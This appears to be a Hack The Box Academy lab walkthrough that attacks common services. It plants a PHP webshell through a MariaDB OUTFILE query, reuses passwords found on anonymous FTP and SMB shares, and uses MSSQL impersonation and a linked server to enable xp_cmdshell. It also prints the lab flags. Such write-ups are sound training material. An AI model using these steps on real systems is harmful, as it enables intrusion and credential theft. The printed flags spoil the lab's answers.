┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ cat WebServersInfo.txt 
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

Let's try and login to the webserver with basic auth.

It worked and we got access to what appears to be a web interface for the FTP protocol on the target, we tried uploading a websell but it will not execute.

![](./attachments/Pasted%20image%2020230216210127.png)

Moving on...

Logging into SQL we found out that we where able to create files, so we created a simple webshell and put it in the web directory.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ mysql -u fiona -p987654321 -h 10.129.195.242
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show variables like "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
MariaDB [mysql]> SELECT "<?php echo shell_exec($_REQUEST[cmd]);?>" INTO OUTFILE 'C:/xampp/htdocs/dashboard/webshell.php';
Query OK, 1 row affected (0.037 sec)
```

Now we can execute commands.

![](./attachments/Pasted%20image%2020230217193418.png)

**Answer:** `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`

---
## Attacking Common Services - Medium
### Question:
![](./attachments/Pasted%20image%2020230215212229.png)

nmap scan on all ports with `-p-` falg.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ nmap -n -sV -sC -p- 10.129.250.4  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 14:13 EST
Nmap scan report for 10.129.250.4
Host is up (0.035s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7108b0c4f3ca9757649770f9fec50c7b (RSA)
|   256 45c3b51463993d9eb32251e59776e150 (ECDSA)
|_  256 2ec2416646efb68195d5aa3523945538 (ED25519)
53/tcp    open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: STLS UIDL RESP-CODES SASL(PLAIN) AUTH-RESP-CODE TOP USER CAPA PIPELINING
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: PIPELINING TOP USER UIDL RESP-CODES CAPA AUTH-RESP-CODE SASL(PLAIN)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
2121/tcp  open  ftp      ProFTPD
30021/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Internal FTP) [10.129.250.4]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port30021-TCP:V=7.93%I=7%D=2/17%Time=63EFD217%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,8E,"220\x20ProFTPD\x20Server\x20\(Internal\x20FTP\)\x20\[10
SF:\.129\.250\.4\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x
SF:20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 229.64 seconds
```

The FTP service on port 30021 has anonymous login enabled.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ ftp 10.129.250.4 -p 30021
Connected to 10.129.250.4.
220 ProFTPD Server (Internal FTP) [10.129.250.4]
Name (10.129.250.4:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||1657|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
ftp> cd simon
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||17130|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
229 Entering Extended Passive Mode (|||9205|)
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
100% |*********************************************************************************************************************|   153      265.38 KiB/s    00:00 ETA
226 Transfer complete
153 bytes received in 00:00 (3.87 KiB/s)
ftp> cd ..
250 CWD command successful
ftp> exit

┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ cat mynotes.txt                    
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

The `mynotes.txt` file contains a lot of strings. 

Let's try and see of one of them is his password.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ ftp 10.129.250.4 -p 2121
Connected to 10.129.250.4.
220 ProFTPD Server (InlaneFTP) [10.129.250.4]
Name (10.129.250.4:kali): simon
331 Password required for simon
Password: 
230 User simon logged in
Remote system type is UNIX.
Using binary mode to transfer files.
```

It was!
User:pass `simon:8Ns8j1b!23hs4921smHzwn`

```
ftp> ls
229 Entering Extended Passive Mode (|||64321|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root           29 Apr 20  2022 flag.txt
drwxrwxr-x   3 simon    simon        4096 Apr 18  2022 Maildir
226 Transfer complete
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||48320|)
150 Opening BINARY mode data connection for flag.txt (29 bytes)
    29       48.99 KiB/s 
226 Transfer complete
29 bytes received in 00:00 (0.71 KiB/s)
ftp> !cat flag.txt
HTB{1qay2wsx3EDC4rfv_M3D1UM}
```

**Answer:** `HTB{1qay2wsx3EDC4rfv_M3D1UM}`

---
## Attacking Common Services - Hard
### Question 1:
![](./attachments/Pasted%20image%2020230215212302.png)

Again, a full nmap scan on all ports with `-p-` falg.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ sudo nmap -n -sV -sC -p- 10.129.203.10
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 14:31 EST
Nmap scan report for 10.129.203.10
Host is up (0.037s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-17T19:31:36
|_Not valid after:  2053-02-17T19:31:36
|_ssl-date: 2023-02-17T19:34:28+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-HARD
| Not valid before: 2023-02-16T19:31:26
|_Not valid after:  2023-08-18T19:31:26
|_ssl-date: 2023-02-17T19:34:28+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-17T19:33:48+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-17T19:33:53
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 158.40 seconds
```

Let's try SMB.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ smbclient -L 10.129.203.10                 
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Home            Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.203.10 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
   
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ smbclient \\\\10.129.203.10\\Home 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 21 17:18:21 2022
  ..                                  D        0  Thu Apr 21 17:18:21 2022
  HR                                  D        0  Thu Apr 21 16:04:39 2022
  IT                                  D        0  Thu Apr 21 16:11:44 2022
  OPS                                 D        0  Thu Apr 21 16:05:10 2022
  Projects                            D        0  Thu Apr 21 16:04:48 2022

                7706623 blocks of size 4096. 3140515 blocks available
smb: \IT\> cd Simon
smb: \IT\Simon\> ls
  .                                   D        0  Thu Apr 21 17:16:07 2022
  ..                                  D        0  Thu Apr 21 17:16:07 2022
  random.txt                          A       94  Thu Apr 21 17:16:48 2022

                7706623 blocks of size 4096. 3162180 blocks available
```

**Answer:** `random.txt`

### Question 2:
![](./attachments/Pasted%20image%2020230215212312.png)

```
smb: \IT\> cd Fiona
smb: \IT\Fiona\> ls
  .                                   D        0  Thu Apr 21 16:11:53 2022
  ..                                  D        0  Thu Apr 21 16:11:53 2022
  creds.txt                           A      118  Thu Apr 21 16:13:11 2022

                7706623 blocks of size 4096. 3141299 blocks available
smb: \IT\Fiona\> get creds.txt
getting file \IT\Fiona\creds.txt of size 118 as creds.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \IT\Fiona\> !cat creds.txt
Windows Creds

kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!
```

Successful login in via RDP confirms the password.

User:pass `fiona:48Ns72!bns74@S84NNNSl`

**Answer:** `48Ns72!bns74@S84NNNSl`

### Question 3:
![](./attachments/Pasted%20image%2020230215212333.png)
*Hint: There are two users that we can impersonate.*

Login to the MSSQL server and find out who we can impersonate.

```
┌──(kali㉿kali)-[~/HTB/AttackingCommonServices]
└─$ sqsh -S 10.129.203.10 -U .\\fiona -P '48Ns72!bns74@S84NNNSl' -h
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

        WIN-HARD\Fiona                                                                                                                        

           0
```

We are logged in as `fiona`.

```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> go

        john                                                                                                                                  

        simon
```

**Answer:** `John`

### Question 4:
![](./attachments/Pasted%20image%2020230215212343.png)

Inpersonate `john`.

```
1> EXECUTE AS LOGIN = 'john'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> go

        john                                                                                                                                  

           0
```

Find linked SQL servers.

```
1> SELECT srvname, isremote FROM sysservers
2> go

        WINSRV02\SQLEXPRESS                                                                                                                   
   
               1

        LOCAL.TEST.LINKED.SRV                                                                                                                 

               0
```

Identify user and it's privileges.

```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
2> go

        WINSRV02\SQLEXPRESS                                                                                                                   

  
        Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
        Sep 24 2019 13:48:23 
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   

        testadmin                                                                                                                             

                  1
```

Looks like we have an admin user.

Now let's execute commands. First we need to enable advanced options.

```
1> EXECUTE('EXEC sp_configure ''show advanced options'',1 RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
2> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Then enable `xp_cmdshell`.

```
1> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1 RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Now we can execute commands.

```
1> EXECUTE('EXEC xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
2> go

        HTB{46u$!n9_l!nk3d_$3rv3r$}
```

**Answer:** `HTB{46u$!n9_l!nk3d_$3rv3r$}`

---
**Tags:** [[Hack The Box Academy]]